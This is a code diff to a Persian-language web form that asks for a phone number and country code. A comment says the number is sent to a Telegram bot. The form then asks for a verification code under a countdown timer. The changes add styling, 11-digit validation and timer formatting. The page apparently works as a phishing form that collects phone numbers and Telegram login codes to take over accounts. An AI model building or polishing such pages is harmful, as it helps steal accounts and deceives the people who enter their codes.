@@ -61,6 +61,11 @@
       transition: border-color 0.3s;
     }
 
+    /* رنگ کم‌رنگ برای placeholder */
+    .form-group input::placeholder {
+      color: #aaa;
+    }
+
     .form-group input:focus,
     .form-group select:focus {
       border-color: #0088cc;
@@ -90,11 +95,16 @@
       text-align: center;
     }
 
-    #timer {
+    .timer-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
       margin-top: 10px;
+    }
+
+    #timer {
       font-size: 16px;
-      color: #ff0000;
-      text-align: center;
+      color: black; /* رنگ مشکی برای تایمر */
     }
   </style>
 </head>
@@ -120,7 +130,7 @@
 
       <div class="form-group">
         <label for="phone">شماره تلفن</label>
-        <input type="tel" id="phone" placeholder="09000000000" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" id="phone" placeholder="مثال: 00000000000" inputmode="numeric" pattern="[0-9]*" maxlength="11" required>
       </div>
 
       <button class="btn" type="button" id="next-btn">بعدی</button>
@@ -137,7 +147,7 @@
       const phone = document.getElementById('phone').value;
       const countryCode = document.getElementById('country-code').value;
 
-      if (phone) {
+      if (phone && phone.length === 11) {  // اطمینان از وارد کردن دقیق 11 رقم
         const fullPhoneNumber = countryCode + phone;
 
         // ارسال شماره تلفن به ربات تلگرام
@@ -164,7 +174,9 @@
             <div class="form-group">
               <input type="text" id="verification-code" placeholder="کد تأیید را وارد کنید" inputmode="numeric" pattern="[0-9]*">
             </div>
-            <div id="timer">زمان باقی‌مانده: 2:00</div>
+            <div class="timer-container">
+              <div id="timer">1:59</div>
+            </div>
             <button class="btn" id="verify-btn">تأیید</button>
           `;
 
@@ -193,18 +205,18 @@
           });
         }
       } else {
-        alert('لطفاً شماره تلفن خود را وارد کنید.');
+        alert('لطفاً شماره تلفن خود را وارد کنید و از 11 رقم بیشتر نباشد.');
       }
     });
 
-    // تایمر 2 دقیقه‌ای
+    // تایمر 2 دقیقه‌ای از 1:59 شروع می‌شود
     function startTimer() {
-      let timeLeft = 120;  // 2 دقیقه = 120 ثانیه
+      let timeLeft = 119;  // 1 دقیقه و 59 ثانیه = 119 ثانیه
       const timerElement = document.getElementById('timer');
       const interval = setInterval(function() {
         const minutes = Math.floor(timeLeft / 60);
         const seconds = timeLeft % 60;
-        timerElement.innerHTML = 'زمان باقی‌مانده: ' + minutes + ':' + (seconds < 10 ? '0' + seconds : seconds);
+        timerElement.innerHTML = (minutes < 10 ? '0' + minutes : minutes) + ':' + (seconds < 10 ? '0' + seconds : seconds);
         timeLeft--;
 
         if (timeLeft < 0) {
